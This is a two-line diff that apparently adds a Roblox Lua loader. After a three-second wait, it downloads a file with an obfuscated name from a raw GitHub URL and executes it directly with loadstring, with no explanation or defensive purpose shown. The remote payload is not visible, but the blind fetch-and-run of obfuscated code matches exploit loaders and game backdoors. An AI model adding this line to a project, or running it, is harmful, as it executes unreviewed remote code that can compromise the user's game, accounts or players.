@@ -1,0 +1,2 @@
+wait(3)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/S2hub3/s7/refs/heads/main/obf_Z2536Zbpmlth626Gmz080SwDQ4G2XyIk676Z8ybR71G98jhlO730BS26PqeT6lC5.lua"))()
